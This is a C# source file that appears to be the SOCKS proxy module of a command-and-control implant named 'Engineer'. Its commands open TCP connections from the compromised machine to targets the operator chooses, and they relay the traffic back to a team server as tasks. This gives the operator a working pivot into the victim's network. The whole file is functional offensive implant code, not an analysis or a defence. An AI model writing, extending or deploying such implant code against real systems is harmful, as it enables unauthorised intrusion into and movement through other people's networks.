using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;
using DynamicEngLoading;
using Engineer.Functions;


namespace Engineer.Commands
{
    internal class socks : EngineerCommand
    {
        public static SynchronizedCollection<string> SocksClients = new();
        public static readonly  ConcurrentDictionary<string, ConcurrentQueue<byte[]>> SocksClientsData = new();
 

        public override string Name => "socks";
        internal static CancellationTokenSource _tokenSource = new();
        public override async Task Execute(EngineerTask task)
        {
            task.Arguments.TryGetValue("/port", out var port);
            //if task.arguments holds key /stop return saying the socks proxy won /port was stopped
            if (task.Arguments.ContainsKey("/stop"))
            {
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults($"Socks proxy on port {port} stopped", task, EngTaskStatus.Complete,TaskResponseType.String);
                _tokenSource.Cancel();
                return;
            }

            ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults($"socks started on team server at port {port}", task, EngTaskStatus.Running,TaskResponseType.String);
        }
    }
    internal class socksConnect : EngineerCommand
    {
        public override string Name => "socksConnect";

        public override async Task Execute(EngineerTask task)
        {
            try
            {
                //try to get the values for /Address and /Port from the task.arguments dictionary convert the address to an IpAddress object and the port to an int
                task.Arguments.TryGetValue("/Address", out var address);
                task.Arguments.TryGetValue("/Port", out var port);
                task.Arguments.TryGetValue("/Client", out var client);
                socks.SocksClients.Add(client);
                socks.SocksClientsData.TryAdd(client, new ConcurrentQueue<byte[]>());
                //Console.WriteLine($"Connecting to {address}:{port}");

                Task.Run(async () => await ConnectSocks(address, port, client));
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults($"Connecting to {address}:{port}" + $"\n{client}", task, EngTaskStatus.Complete,TaskResponseType.String);
            }
            
            catch(Exception e)
            {
                //Console.WriteLine(e.Message);
                //Console.WriteLine(e.StackTrace);
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("error with socks connect", task, EngTaskStatus.Failed,TaskResponseType.String);
            }
        }
        
        private async Task ConnectSocks(string address, string port,string client)
        {
            var ipAddress = IPAddress.Parse(address);
            var portInt = int.Parse(port);
            // connect to destination
            var destination = new TcpClient();
            destination.ReceiveBufferSize = 131070;
            destination.SendBufferSize = 131070;

            try
            {               
                await destination.ConnectAsync(ipAddress, portInt);
                //Console.WriteLine($"Connected to {ipAddress}:{portInt}");
                while (!socks._tokenSource.IsCancellationRequested)
                {
                    
                    ////if destination is not connected remove it from the socks clients list and dictionarys and exit while loop
                    //if (!destination.Connected)
                    //{
                    //    socks.SocksClients.Remove(client);
                    //    socks.SocksClientsData.TryRemove(client, out var _);
                    //    break;
                    //}
                    
                    // send to destination
                    if (!socks.SocksClientsData[client].IsEmpty)
                    {
                        socks.SocksClientsData[client].TryDequeue(out var data);
                        //Console.WriteLine($"Engineer sending client {client} {data.Length} bytes");
                        await destination.SendData(data, socks._tokenSource.Token);
                    }
                    // read from destination
                    if (destination.DataAvailable())
                    {
                        var resp = await destination.ReceiveData(socks._tokenSource.Token);
                        //Console.WriteLine("sending teamerver " + resp.Length + " bytes " + $"for client {client}");
                        //make a new engineer task with the argument /data which is resp converted to a base64 string and then add the task to the queue
                        var task = new EngineerTask
                        {
                            Id = Guid.NewGuid().ToString(),
                            Command = "socksReceive",
                            File = resp,
                            Arguments = new Dictionary<string, string>
                        {
                            {"/client",client }
                        }
                        };
                        Task.Run(async() => await Tasking.DealWithTask(task));
                    }
                    // rip cpu
                    await Task.Delay(2);
                }
            }
            catch (Exception e)
            {
                //Console.WriteLine(e.Message);
                //Console.WriteLine(e.StackTrace);
            }
        }
    }
    
    internal class SocksSend : EngineerCommand
    {
        public override string Name => "socksSend";

        public override async Task Execute(EngineerTask task)
        {
            task.Arguments.TryGetValue("/client", out var client);

            //while the socks client is waiting for data to be sent do not send the data 
            var req = task.File;
            socks.SocksClientsData[client].Enqueue(req);
        }
    }
    
    internal class SocksReceive : EngineerCommand
    {
        public override string Name => "socksReceive";

        public override async Task Execute(EngineerTask task)
        {
            // trygetvalue of task.arguments /data and return that value
            var sockContent = task.File;
            //set task.FIle to null otherwise we are sending the data in the task object and the result string 
            task.Arguments.TryGetValue("/client", out var client);
            byte[] sockClient = client.JsonSerialize();
            byte[] socks_client_length = BitConverter.GetBytes(sockClient.Length);
            task.File = null;
            byte[] finalSocksRec_content = socks_client_length.Concat(sockClient).Concat(sockContent).ToArray();

           ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(finalSocksRec_content, task, EngTaskStatus.Complete, TaskResponseType.None);
        }
    }

    internal static class Extensions
    {
        public static async Task<byte[]> ReceiveData(this TcpClient client, CancellationToken token)
        {
            using var ms = new MemoryStream();
            var ns = client.GetStream();

            int read;

            do
            {
                var buf = new byte[131070];
                read = await ns.ReadAsync(buf, 0, buf.Length, token);

                if (read == 0)
                    break;

                await ms.WriteAsync(buf, 0, read, token);

            } while (read >= 131070);

            return ms.ToArray();
        }

        public static async Task SendData(this TcpClient client, byte[] data, CancellationToken token)
        {
            
            var ns = client.GetStream();
            await ns.WriteAsync(data, 0, data.Length, token);
        }

        public static bool DataAvailable(this TcpClient client)
        {
            var ns = client.GetStream();
            return ns.DataAvailable;
        }

        public static void Clear(this MemoryStream stream)
        {
            var buffer = stream.GetBuffer();
            Array.Clear(buffer, 0, buffer.Length);
            stream.Position = 0;
            stream.SetLength(0);
        }
    }
}
